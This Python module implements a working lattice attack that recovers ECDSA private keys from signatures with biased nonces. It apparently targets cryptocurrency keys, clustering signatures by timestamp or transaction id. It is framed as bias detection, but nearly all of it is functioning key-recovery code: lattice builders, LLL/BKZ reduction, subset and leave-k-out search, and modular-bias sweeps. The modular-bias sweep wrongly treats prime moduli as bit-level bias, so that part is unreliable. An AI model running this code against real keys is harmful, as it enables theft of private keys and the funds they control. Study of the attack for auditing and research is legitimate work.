# SPDX-License-Identifier: GPL-3.0-or-later
"""
GPLv3 - this module's lattice construction is adapted from bitlogik/lattice-attack
(https://github.com/bitlogik/lattice-attack), used and redistributed under GPLv3.
If you incorporate this module, your project must remain GPLv3-compatible.

Phase 2: HNP (Hidden Number Problem) lattice attack for biased ECDSA nonces.

Detection and solving are the same step here on purpose: if reduction produces
a vector that yields a d satisfying d*G == Q, the bias is both detected and
exploited in one run. If it doesn't, we correctly report "no exploitable bias
found under the tested hypotheses" - not a false "clean" verdict, since only
the tested hypotheses are ruled out.

Verified against synthetic biased data (both MSB and LSB branches) with exact
public-key-point verification before being trusted in this pipeline.

References:
- Boneh & Venkatesan, "Hardness of Computing the Most Significant Bits of
  Secret Keys in Diffie-Hellman and Related Schemes" (1996) - HNP origin
- Howgrave-Graham & Smart, "Lattice Attacks on Digital Signature Schemes" (2001)
- Breitner & Heninger, "Biased Nonce Sense: Lattice Attacks against Weak
  ECDSA Signatures in Cryptocurrencies" (2019), eprint.iacr.org/2019/023
"""

from dataclasses import dataclass
import os
import multiprocessing as mp
from concurrent.futures import ProcessPoolExecutor, as_completed
from fpylll import IntegerMatrix, LLL, BKZ
from curve import Signature, N


def _inv(a: int, m: int) -> int:
    return pow(a, -1, m)


def compute_min_viable_subset_size(bias_bits: int) -> int:
    """
    Smallest subset size that could plausibly succeed for a given bias
    strength, independent of purity. Extracted as its own function (rather
    than inlined in sweep_bias_hypotheses) specifically so it can be
    tested directly - an earlier bug here (a fixed floor of 6, too small
    for anything above ~24-32 bit bias) went undetected because the
    original regression test only checked run_lattice_attack in isolation
    and never actually exercised this computation.

    Rule of thumb: roughly 256/bias_bits + 2 signatures needed for LLL to
    have a realistic shot (each signature contributes ~bias_bits of usable
    constraint on the lattice). Empirically verified against synthetic
    all-biased data at the boundary for 12/16/24/32/64-bit bias during
    development - see tests/test_hnp_lattice.py.
    """
    return max(4, int(256 / max(bias_bits, 1)) + 2)


def compute_min_detectable_bias_bits(num_signatures: int, max_search: int = 256) -> int | None:
    """
    Inverse of compute_min_viable_subset_size: given a signature count,
    what's the WEAKEST (smallest bit-count) bias this many signatures
    could possibly detect, assuming they were all pure/biased? Smaller
    bias is harder to detect (needs more signatures), so this returns the
    smallest bias_bits value for which compute_min_viable_subset_size
    would allow num_signatures to be sufficient.

    Returns None if num_signatures is too few to test ANY bias strength
    at all - compute_min_viable_subset_size has a hard floor of 4
    regardless of bias strength (the lattice needs a structural minimum
    number of rows), so fewer than 4 signatures can never be tested,
    period, not even for the most extreme possible bias.

    This is meant for REPORTING, not for deciding which hypotheses to
    run - it answers "given what I have, what's the honest floor on what
    I could have found if it were there?" so a "no bias found" result can
    be qualified accurately (e.g. "this rules out bias >= 14 bits, but
    says nothing about weaker bias than that").
    """
    for bits in range(1, max_search + 1):
        if compute_min_viable_subset_size(bits) <= num_signatures:
            return bits
    return None


@dataclass
class BiasHypothesis:
    """
    side='msb' -> top `bits` bits of k are assumed known
    side='lsb' -> bottom `bits` bits of k are assumed known

    known_value: the actual value of those known bits, as an integer in
    [0, 2^bits). Defaults to 0 (the common "biased to zero" case, e.g.
    Minerva). Set to a specific non-zero value when there's a concrete
    reason to suspect a particular constant - e.g. a version byte or
    fixed prefix from a specific broken RNG/library - rather than pure
    zero-bias. This is NOT a blind search over all 2^bits possible
    values (that search space is only tractable for very small `bits`,
    at which point it stops being meaningfully different from brute
    force); it's for testing one or a few SPECIFIC suspected constants.
    """
    side: str
    bits: int
    known_value: int = 0

    def label(self) -> str:
        if self.known_value == 0:
            return f"{self.side}-{self.bits}"
        return f"{self.side}-{self.bits}-known0x{self.known_value:x}"


@dataclass
class LatticeResult:
    hypothesis: BiasHypothesis
    num_signatures_used: int
    lattice_dimension: int
    candidate_d: int | None
    verified: bool
    used_bkz: bool
    note: str


def _build_matrix_msb(sigs: list[Signature], num_bits: int, known_chunks: list[int]) -> IntegerMatrix:
    m = len(sigs)
    lattice = IntegerMatrix(m + 2, m + 2)
    kbi = 2 ** num_bits
    for i in range(m):
        lattice[i, i] = 2 * kbi * N
        s_inv = _inv(sigs[i].s, N)
        lattice[m, i] = 2 * kbi * ((sigs[i].r * s_inv) % N)
        lattice[m + 1, i] = (
            2 * kbi * ((known_chunks[i] * pow(2, 256 - num_bits, N) - sigs[i].z * s_inv) % N)
            + N
        )
    lattice[m, m] = 1
    lattice[m + 1, m + 1] = N
    return lattice


def _build_matrix_lsb(sigs: list[Signature], num_bits: int, known_chunks: list[int]) -> IntegerMatrix:
    m = len(sigs)
    lattice = IntegerMatrix(m + 2, m + 2)
    kbi = 2 ** num_bits
    kbi_inv = _inv(kbi, N)
    for i in range(m):
        lattice[i, i] = 2 * kbi * N
        s_inv = _inv(sigs[i].s, N)
        lattice[m, i] = 2 * kbi * ((kbi_inv * (sigs[i].r * s_inv)) % N)
        lattice[m + 1, i] = (
            2 * kbi * ((kbi_inv * (known_chunks[i] - sigs[i].z * s_inv)) % N)
            + N
        )
    lattice[m, m] = 1
    lattice[m + 1, m + 1] = N
    return lattice


def _extract_candidate(mat: IntegerMatrix, pubkey_point, generator) -> int | None:
    """Scan reduced basis rows for a d that actually verifies against Q = d*G."""
    for row in range(mat.nrows):
        val = mat[row, mat.ncols - 2] % N
        if val == 0:
            continue
        for cand in (val, N - val):
            if cand * generator == pubkey_point:
                return cand
    return None




def _extract_candidate_enumerated(
    mat: IntegerMatrix,
    pubkey_point,
    generator,
    radius: int = 2,
    max_combinations: int = 5000,
) -> int | None:
    """
    Pruned lattice enumeration: after LLL/BKZ, enumerate small integer
    combinations of the shortest basis vectors to find a candidate d.
    
    Takes the first L = min(8, dim) shortest rows and enumerates:
    v = sum(c_i * b_i) for c_i in [-R, R], not all zero, with sum(|c_i|) <= R
    
    Extracts candidate d from mat.ncols - 2 column of v. Tests d*G == Q.
    
    Parameters:
        mat: Reduced lattice matrix (IntegerMatrix)
        pubkey_point: Public key point Q
        generator: EC generator point G
        radius: Enumeration radius R (default 2)
        max_combinations: Hard cap on combinations to try
    
    Returns:
        Recovered private key d, or None if not found
    """
    from itertools import product
    
    dim = mat.nrows
    L = min(8, dim)
    d_col = mat.ncols - 2
    
    # Get the L shortest rows (already sorted by LLL/BKZ)
    rows = []
    for i in range(L):
        row = [mat[i, j] for j in range(mat.ncols)]
        rows.append(row)
    
    # Generate coefficient combinations with sum(|c_i|) <= radius
    combinations_tried = 0
    
    for total_weight in range(1, radius + 1):
        # Generate all ways to distribute total_weight across L coefficients
        for coeffs in product(range(-radius, radius + 1), repeat=L):
            if sum(abs(c) for c in coeffs) != total_weight:
                continue
            if all(c == 0 for c in coeffs):
                continue
            
            combinations_tried += 1
            if combinations_tried > max_combinations:
                return None
            
            # Compute linear combination
            d_val = sum(coeffs[i] * rows[i][d_col] for i in range(L)) % N
            
            if d_val == 0:
                continue
            
            # Test both d and N - d
            for cand in (d_val, N - d_val):
                if cand * generator == pubkey_point:
                    return cand
    
    return None

def run_lattice_attack(
    sigs: list[Signature],
    hyp: BiasHypothesis,
    pubkey_point,
    generator,
    known_chunks: list[int] = None,
    use_bkz: bool = False,
    bkz_block_size: int = 20,
    enumerate_radius: int = 0,
) -> LatticeResult:
    """
    Run the HNP lattice attack for one bias hypothesis against one pubkey's
    signature set. known_chunks defaults to all-zero (the common case: bias
    forces the known bits to zero, e.g. Minerva-style LSB=0).

    pubkey_point / generator: passed explicitly so this module stays
    independent of any specific EC library choice by the caller.
    
    enumerate_radius: if > 0, after LLL/BKZ, also try pruned enumeration
    with _extract_candidate_enumerated using this radius.
    """
    m = len(sigs)
    min_viable = compute_min_viable_subset_size(hyp.bits)
    if m < min_viable:
        return LatticeResult(
            hyp, m, 0, None, False, False,
            f"skipped: {m} signatures is below the estimated minimum viable "
            f"size ({min_viable}) for {hyp.bits}-bit bias - running LLL here "
            f"would be doomed regardless of purity (see "
            f"compute_min_viable_subset_size), not worth the wasted "
            f"reduction. Add more signatures for this key, or this may "
            f"simply not be the right bias hypothesis."
        )

    if known_chunks is None:
        known_chunks = [hyp.known_value] * m

    builder = _build_matrix_msb if hyp.side == "msb" else _build_matrix_lsb
    M = builder(sigs, hyp.bits, known_chunks)
    dim = M.nrows

    LLL.reduction(M)
    candidate = _extract_candidate(M, pubkey_point, generator)
    
    # Try enumeration after LLL if requested and no direct hit
    if candidate is None and enumerate_radius > 0:
        candidate = _extract_candidate_enumerated(M, pubkey_point, generator, radius=enumerate_radius)
        if candidate is not None:
            return LatticeResult(hyp, m, dim, candidate, True, False,
                                  "recovered via LLL + enumeration")

    if candidate is None and use_bkz:
        M2 = builder(sigs, hyp.bits, known_chunks)
        LLL.reduction(M2)
        BKZ.reduction(M2, BKZ.Param(block_size=bkz_block_size))
        candidate = _extract_candidate(M2, pubkey_point, generator)
        if candidate is not None:
            return LatticeResult(hyp, m, dim, candidate, True, True,
                                  "recovered via BKZ after LLL alone was insufficient")
        
        # Try enumeration after BKZ if still no hit
        if enumerate_radius > 0:
            candidate = _extract_candidate_enumerated(M2, pubkey_point, generator, radius=enumerate_radius)
            if candidate is not None:
                return LatticeResult(hyp, m, dim, candidate, True, True,
                                      "recovered via BKZ + enumeration")

    if candidate is not None:
        return LatticeResult(hyp, m, dim, candidate, True, False,
                              "recovered via LLL, verified against public key point")

    return LatticeResult(hyp, m, dim, None, False, use_bkz,
                          "no candidate verified against public key under this hypothesis")

def _run_one_attempt_worker(args):
    """
    Top-level worker function for ProcessPoolExecutor - must be a plain
    module-level function (not a closure/lambda) since it needs to be
    picklable to send to worker processes. Unpacks a single attempt's
    arguments and runs run_lattice_attack unchanged - this function is
    just plumbing, not new lattice logic.
    """
    sigs, hyp, pubkey_point, generator, use_bkz, bkz_block_size, note_suffix = args
    result = run_lattice_attack(
        sigs, hyp, pubkey_point, generator,
        use_bkz=use_bkz, bkz_block_size=bkz_block_size,
    )
    if note_suffix:
        result.note += note_suffix
    return result


def run_attempts_in_parallel(
    attempt_specs: list[tuple],
    max_workers: int = None,
) -> list["LatticeResult"]:
    """
    Run a batch of independent lattice attempts across multiple processes,
    stopping early (cancelling remaining work) as soon as one verifies.

    attempt_specs: list of (sigs, hyp, pubkey_point, generator, use_bkz,
    bkz_block_size, note_suffix) tuples - each one a fully independent
    call to run_lattice_attack. These are genuinely independent (no shared
    state, no ordering dependency between them), which is what makes this
    parallelizable at all - the underlying lattice math in
    run_lattice_attack is completely untouched by this function.

    max_workers defaults to os.cpu_count(). On a single-core machine this
    provides no speedup and adds process-spawning overhead - verified
    during development that this environment has only 1 CPU, so the
    benefit of this function could only be confirmed structurally
    (correct early-exit behavior, correct aggregation of results) here,
    not measured as an actual wall-clock improvement. On a genuine
    multi-core machine, independent attempts (subset sampling, leave-k-out
    combinations) can run concurrently instead of strictly one-at-a-time.

    KNOWN ISSUE (cosmetic, does not affect correctness): when this
    function is called repeatedly in a loop (as sweep_bias_hypotheses
    does, once per bias hypothesis) from inside a rich.Progress live-
    rendering context, Python's multiprocessing resource_tracker
    intermittently prints "there appear to be N leaked semaphore objects"
    at process exit. This was reproducible roughly 2 out of 3 runs during
    development, but never in isolated reproduction scripts outside that
    exact context, and every affected run still produced correct results
    - the warning reflects noisy cleanup accounting, not lost work or an
    incorrect answer. Root cause not conclusively identified despite
    checking fork vs spawn, single vs double shutdown() calls, and
    wait=True vs wait=False; likely a known class of CPython
    ProcessPoolExecutor create/teardown timing issue rather than a bug
    specific to this module's logic. If this needs to be eliminated
    rather than tolerated, the more robust fix is a long-lived pool
    reused across the whole sweep instead of one created per hypothesis
    batch - not yet implemented, flagged here for future work.

    Returns every attempted result whose work was allowed to complete
    before the first success (or before all specs were exhausted) - NOT
    necessarily all of attempt_specs, since remaining work is cancelled
    once a hit is found. This mirrors the sequential version's behavior:
    it also stops issuing new attempts after the first success, though
    the sequential version never starts work it doesn't need, while the
    parallel version may have already started (but not necessarily
    finished) a few extra attempts concurrently with the one that
    succeeds - those are cancelled, not silently included, so the
    returned list should not be assumed to always be shorter than a
    sequential run would have needed.
    """
    if not attempt_specs:
        return []

    if max_workers is None:
        max_workers = os.cpu_count() or 1

    # Use 'spawn' explicitly rather than the platform default ('fork' on
    # Linux). fork() duplicates the parent process's memory including any
    # locks held by other threads at the moment of fork - if the parent
    # (e.g. a test runner or the rich console's internal state) has other
    # threads active, this can deadlock in the child. spawn starts a
    # clean interpreter instead; slower to start per-worker, but this
    # cost is paid once per ProcessPoolExecutor, not per attempt, and
    # correctness matters more than that fixed startup cost here.
    ctx = mp.get_context("spawn")

    results = []
    with ProcessPoolExecutor(max_workers=max_workers, mp_context=ctx) as executor:
        futures = {executor.submit(_run_one_attempt_worker, spec): spec for spec in attempt_specs}
        for future in as_completed(futures):
            result = future.result()
            results.append(result)
            if result.verified:
                # Cancel whatever hasn't started yet. Already-running
                # workers are allowed to finish naturally. The `with`
                # block's own __exit__ calls executor.shutdown(wait=True)
                # for us on the way out - an earlier version of this
                # function ALSO called shutdown explicitly in a finally
                # block, which meant shutdown could be invoked twice
                # (once explicitly, once via context exit); that double
                # call was the likely source of an intermittent
                # resource_tracker semaphore leak warning observed during
                # development specifically when this function was called
                # repeatedly inside a rich.Progress live-rendering
                # context. Letting the context manager handle shutdown
                # exactly once, rather than duplicating that call, is the
                # correct fix.
                for f in futures:
                    f.cancel()
                break

    return results


def _try_leave_k_out(
    sigs: list,
    hyp: "BiasHypothesis",
    pubkey_point,
    generator,
    min_size: int,
    use_bkz: bool,
    bkz_block_size: int,
    max_drop: int = 2,
    max_attempts: int = 40,
    on_attempt=None,
):
    """
    Given a candidate signature set that failed as-is, try dropping 1 up
    to max_drop signatures and re-attempting. Only useful for small
    candidate sets (a metadata cluster, not the full dataset) since the
    number of combinations grows combinatorially: C(n,1) for leave-1-out,
    C(n,2) for leave-2-out on top of that. Leave-1-out is tried
    exhaustively first (cheap: at most n attempts) since single-
    contaminant cases are far more common than double-contaminant ones in
    practice; leave-2-out is capped at max_attempts total combinations
    rather than run exhaustively, since C(16,2)=120 combinations measured
    at ~8ms each during development cost noticeably more wall-clock time
    than it's worth when the contamination isn't actually just 1-2
    signatures (i.e. when leave-k-out was never going to succeed anyway).
    Returns the first verified LatticeResult found, or None.

    This exists because the lattice construction has ZERO tolerance for
    contamination - verified during development that even a single clean
    signature mixed into an otherwise-pure biased set breaks recovery
    completely, and BKZ at higher block sizes does not route around it
    (unlike noise-tolerant problems such as LWE, this construction
    requires every row to satisfy an exact modular relation). So a
    near-pure metadata cluster with 1-2 contaminants needs those specific
    signatures identified and removed, not a stronger solver.
    """
    from itertools import combinations

    n = len(sigs)
    if n - 1 < min_size:
        return None  # nothing left to try if we can't drop even one

    attempts_budget_remaining = max_attempts

    for drop_count in range(1, max_drop + 1):
        if n - drop_count < min_size:
            break

        # Build this drop_count's full batch of combinations up front and
        # run them in parallel, but keep drop_count=1 and drop_count=2 as
        # SEPARATE batches (not merged into one) - single-contaminant
        # cases are far more common in practice than double-contaminant
        # ones, so leave-1-out should be fully exhausted (and return
        # immediately if it finds the answer) before leave-2-out work is
        # even started, same priority ordering as the sequential version.
        combos = list(combinations(range(n), drop_count))
        if len(combos) > attempts_budget_remaining:
            combos = combos[:attempts_budget_remaining]
        if not combos:
            break

        specs = []
        for drop_indices in combos:
            subset = [s for i, s in enumerate(sigs) if i not in drop_indices]
            note_suffix = f" (leave-{drop_count}-out, {len(subset)}/{n} sigs)"
            specs.append((subset, hyp, pubkey_point, generator, use_bkz, bkz_block_size, note_suffix))

        if on_attempt:
            on_attempt(hyp.label(), f"leave-{drop_count}-out batch ({len(specs)} combinations)")

        batch_results = run_attempts_in_parallel(specs)
        attempts_budget_remaining -= len(combos)

        hit = next((r for r in batch_results if r.verified), None)
        if hit is not None:
            return hit

        if attempts_budget_remaining <= 0:
            return None

    return None


def sweep_bias_hypotheses(
    sigs: list[Signature],
    pubkey_point,
    generator,
    bit_widths: list[int] = None,
    escalate_to_bkz: bool = True,
    bkz_block_size: int = 20,
    mode: str = "fast",
    min_subset_size: int = None,
    max_subset_attempts: int = 25,
    rng_seed: int = None,
    on_attempt=None,
) -> list[LatticeResult]:
    """
    Try both MSB and LSB bias hypotheses across a range of bit widths.

    mode='fast' (default): use the full signature set for this key at each
    hypothesis. Correct and cheap when every signature from this key shares
    the same bias - the common case (a broken RNG affects every signature
    it produces).

    mode='thorough': also try random subsets of the signature set at each
    hypothesis. Before falling back to blind random sampling, this mode
    first tries metadata-informed candidates (timestamp/txid clustering,
    see subset_clustering.py) plus leave-1/2-out on near-pure clusters.

    Measured performance (development test scenario: 25 clean + 15
    32-bit-MSB-biased signatures for one key, biased signatures clustered
    within a ~20-day window against a full year of clean background
    noise): metadata-informed clustering + leave-k-out succeeded in
    roughly 1/3 of trials, typically within single-digit attempts when it
    worked. Blind random sampling on the same data failed after 300
    attempts. This is a REAL but PROBABILISTIC improvement, not a
    reliable fix - whether it succeeds depends on how cleanly the biased
    signatures happen to separate from background noise in time, which
    varies run to run. Do not treat a "no bias found" result under this
    mode as strong evidence of a clean key when metadata clustering was
    the only lever tried and failed; the underlying bias may still be
    present but not cleanly separable by timestamp given how the data
    happened to fall.

    min_subset_size: if None (default), computed per-hypothesis as
    roughly bits_total/bias_bits + 2, the same rule of thumb used to
    estimate lattice feasibility elsewhere in this module. Pass an
    explicit value to override, but note that going below the computed
    floor for a given hypothesis wastes attempts on subset sizes that
    cannot succeed in principle, not just in practice.

    on_attempt: optional callback(hypothesis_label: str, subset_info: str)
    invoked before each lattice attempt, so a caller (e.g. a UI progress
    bar) can report live status without duplicating this function's logic.

    Stops early once any attempt verifies (no point continuing once d is found).
    Returns every attempted result either way, for a full audit trail.
    """
    import random as _random
    rng = _random.Random(rng_seed)

    if bit_widths is None:
        bit_widths = [4, 8, 16, 32, 64, 96, 128]

    results = []
    for bits in bit_widths:
        for side in ("msb", "lsb"):
            hyp = BiasHypothesis(side=side, bits=bits)

            if on_attempt:
                on_attempt(hyp.label(), "full set")

            # always try the full set first - cheapest, and correct if the
            # bias is uniform across all signatures for this key
            result = run_lattice_attack(
                sigs, hyp, pubkey_point, generator,
                use_bkz=escalate_to_bkz, bkz_block_size=bkz_block_size,
            )
            results.append(result)
            if result.verified:
                return results

            if mode != "thorough":
                continue

            effective_min_size = min_subset_size
            if effective_min_size is None:
                effective_min_size = compute_min_viable_subset_size(bits)

            # Try metadata-informed candidates FIRST (timestamp/txid
            # clustering) - these are ranked by density and ordered to
            # prioritize plausible single-incident groupings, so they
            # should succeed much faster than blind random sampling when
            # real time-bounded metadata is present. Falls through
            # harmlessly (empty list) when no usable metadata exists.
            from subset_clustering import propose_subset_candidates
            informed_candidates = propose_subset_candidates(
                sigs, min_cluster_size=effective_min_size,
            )
            for candidate in informed_candidates:
                if len(candidate.signatures) < effective_min_size:
                    continue

                if on_attempt:
                    on_attempt(hyp.label(), f"informed candidate ({candidate.method}, {len(candidate.signatures)} sigs)")

                cand_result = run_lattice_attack(
                    candidate.signatures, hyp, pubkey_point, generator,
                    use_bkz=escalate_to_bkz, bkz_block_size=bkz_block_size,
                )
                cand_result.note += f" (metadata-informed candidate: {candidate.description})"
                results.append(cand_result)
                if cand_result.verified:
                    return results

                # A cluster can be GOOD (dense, mostly one incident) but
                # still fail outright if even one signature inside it is
                # actually clean. This is not a solver-strength problem -
                # verified during development that BKZ at higher block
                # sizes does not rescue a single-contaminant set, because
                # the lattice construction requires every row to satisfy
                # an exact modular relation (unlike noise-tolerant
                # problems such as LWE, one wrong row changes which
                # lattice is being reduced, not just adds bounded error).
                # So instead of hoping a stronger solver fixes it, try
                # dropping 1-2 signatures directly (leave-k-out) - cheap
                # when the candidate cluster is already small.
                leave_k_out_result = _try_leave_k_out(
                    candidate.signatures, hyp, pubkey_point, generator,
                    effective_min_size, escalate_to_bkz, bkz_block_size,
                    max_drop=2, on_attempt=on_attempt,
                )
                if leave_k_out_result is not None:
                    leave_k_out_result.note += (
                        f" (leave-k-out on metadata-informed candidate: {candidate.description})"
                    )
                    results.append(leave_k_out_result)
                    return results

            # thorough mode: sample random subsets, on the theory that a
            # subset consisting entirely of biased signatures will succeed
            # where the full (mixed) set fails.
            #
            # The minimum viable subset size depends on the bias strength:
            # a subset too small cannot succeed no matter how pure it is,
            # because the lattice needs enough equations relative to
            # unknowns. Empirically (and consistent with the ~256/bits + 2
            # rule of thumb), 32-bit bias needs >= 8 signatures, 16-bit
            # needs >= 18, etc - verified against synthetic all-biased data
            # at exactly the boundary before shipping this floor.
            m = len(sigs)
            if m <= effective_min_size:
                continue  # nothing smaller to usefully try

            candidate_sizes = list(range(effective_min_size, m))
            weights = [1.0 / ((s - effective_min_size + 1) ** 1.5) for s in candidate_sizes]

            # Build all subset draws up front (same sampling distribution
            # as the sequential version), then run them as a batch. This
            # changes WHEN work happens (all subsets are drawn before any
            # are tried, rather than one at a time) but not WHAT is tried -
            # the sampling distribution and attempt count are identical to
            # the sequential version, just parallelized across processes
            # where multiple CPU cores are available. On a single-core
            # machine this provides no speedup (see run_attempts_in_parallel
            # docstring) but is still correct.
            if on_attempt:
                on_attempt(hyp.label(), f"preparing {max_subset_attempts} parallel subset attempts")

            specs = []
            for attempt in range(max_subset_attempts):
                subset_size = rng.choices(candidate_sizes, weights=weights, k=1)[0]
                subset = rng.sample(sigs, subset_size)
                note_suffix = f" (subset attempt {attempt+1}/{max_subset_attempts}, size {subset_size}/{m})"
                specs.append((subset, hyp, pubkey_point, generator, escalate_to_bkz, bkz_block_size, note_suffix))

            batch_results = run_attempts_in_parallel(specs)
            results.extend(batch_results)
            if any(r.verified for r in batch_results):
                return results

    return results


def sweep_modular_bias(
    sigs: list,
    pubkey_point,
    generator,
    max_modulus: int = 2**16,
    on_attempt=None,
) -> list:
    """
    Sweep for modular bias: k ≡ c (mod m) for small m and c.
    
    If k ≡ c (mod m) for known small m and c, this is equivalent to an
    LSB bias of log2(m) bits with known chunk c.
    
    Implementation: For each modulus m in a curated list (powers of 2 up to
    max_modulus, plus small primes), and for each residue c in [0, min(m-1, 16)],
    build an LSB lattice using _build_matrix_lsb with num_bits = int(log2(m))
    and known_chunks = [c] * len(sigs).
    
    Optimization: Skip if compute_min_viable_subset_size(num_bits) > len(sigs).
    Stop early on first verified hit.
    
    Returns list of LatticeResult.
    """
    import math
    
    results = []
    
    # Curated list of moduli to test
    moduli = []
    
    # Powers of 2
    power = 2
    while power <= max_modulus:
        moduli.append(power)
        power *= 2
    
    # Small primes
    small_primes = [3, 5, 7, 11, 13, 17, 19, 23, 29, 31]
    for p in small_primes:
        if p <= max_modulus and p not in moduli:
            moduli.append(p)
    
    moduli = sorted(set(moduli))
    
    for m in moduli:
        num_bits = int(math.log2(m)) if m > 1 else 1
        
        # Skip if not enough signatures
        min_viable = compute_min_viable_subset_size(num_bits)
        if len(sigs) < min_viable:
            continue
        
        # Test small residues (c = 0 is most common)
        max_residue = min(m - 1, 16)
        for c in range(max_residue + 1):
            if on_attempt:
                on_attempt(f"modular bias m={m}, c={c}", f"{len(sigs)} sigs")
            
            hyp = BiasHypothesis(side="lsb", bits=num_bits, known_value=c)
            known_chunks = [c] * len(sigs)
            
            result = run_lattice_attack(
                sigs, hyp, pubkey_point, generator,
                known_chunks=known_chunks,
                use_bkz=False,
            )
            results.append(result)
            
            if result.verified:
                return results
    
    return results
